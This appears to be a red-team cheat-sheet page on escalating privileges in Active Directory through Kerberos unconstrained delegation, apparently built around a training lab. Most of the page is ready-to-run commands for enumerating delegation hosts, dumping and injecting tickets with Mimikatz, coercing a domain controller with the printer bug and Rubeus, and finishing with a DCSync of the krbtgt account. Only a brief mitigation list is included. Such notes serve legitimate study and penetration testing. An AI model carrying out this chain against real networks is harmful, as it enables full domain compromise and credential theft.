---
title: "Unconstrained Delegation"
description: "Privilege escalation using unconstrained delegation."
lead: "Using unconstrained delegation for privilege escalation in Active Directory with PowerView, Mimikatz, and Rubeus."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_privilege_escalation"
weight: 30
toc: true
---

## General

- When set for service account, allows delegation to any service to any resource on the domain as a user
- When enabled, DC places user's TGT inside TGS when user requests access to service with unconstrained delegation enabled
- Server extracts TGT from TGS and stores it in LSASS
- Server can reuse the user's TGT to access resoruces
- Escalate privileges when extracting TGT from Domain Admins or other HVTs
- Note: need local admin access on the machine to extract tickets

## Exploitation

```powershell
# Get computers that have unconstrained delegation enabled
# Using PowerView
Get-NetComputer -Unconstrained

# Using AD Module
Get-ADComputer -Filter { TrustedForDelegation -eq $true }
Get-ADUser -Filter { TrustedForDelegation -eq $true }

# ldapdomaindump
ldapdomaindump -u "DOMAIN\\Account" -p "Password123*" 10.10.10.10   
grep TRUSTED_FOR_DELEGATION domain_computers.grep

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u username -p password --trusted-for-delegation

# Monitor DA logins on computer
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose

# Check if we have local admin access on that machine using PowerView
Find-LocalAdminAccess -ComputerName dcorp-appsrv

# Get session on machine as local admin and check for tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

# Export tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Inject ticket into session
Invoke-Mimikatz -Command '"kerberos:ptt ticket.kirbi"'
```

## Printer Bug

- Trick HVT to connect to machine with Unconstrained Delegation enabled
- Force Domain Admin to connect to specific machine
- https://github.com/leechristensen/SpoolSample

```powershell
# Start capturing for TGTs using Rubeus
.\Rubeus.exe monitor /interval:5 /nowrap

# Run MS-RPRN.exe
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appserv.dollarcorp.moneycorp.local

# From https://github.com/leechristensen/SpoolSample
.\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
# DC01.HACKER.LAB is the domain controller we want to compromise
# HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.

# From https://github.com/dirkjanm/krbrelayx
printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>

# From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689
python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>

# Copy base64 encoded TGT, remove extra spaces and inject it on attacker machine
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Run DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## Mitigation

- Limit DA/Admin logins to specific servers
- Set "Account is sensitive and cannot be delegated" for privileged accounts

## Further Reading

- [HackTricks: Unconstrained Delegation](https://book.hacktricks.xyz/windows/active-directory-methodology/unconstrained-delegation)
- [PayloadsAllTheThings: Kerberos Unconstrained Delegation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-unconstrained-delegation)
- [iRedTeam: Kerberos Unconstrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [iRedTeam: Domain Compromise via DC Print Server and Kerberos Delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
- [Security Focus: Analysing Account is Sensitive and cannot be Delegated for Privileged Accounts](https://docs.microsoft.com/en-us/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts)
- [SpecterOps: Hunting in Active Directory: Unconstrained Delegation & Forest Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
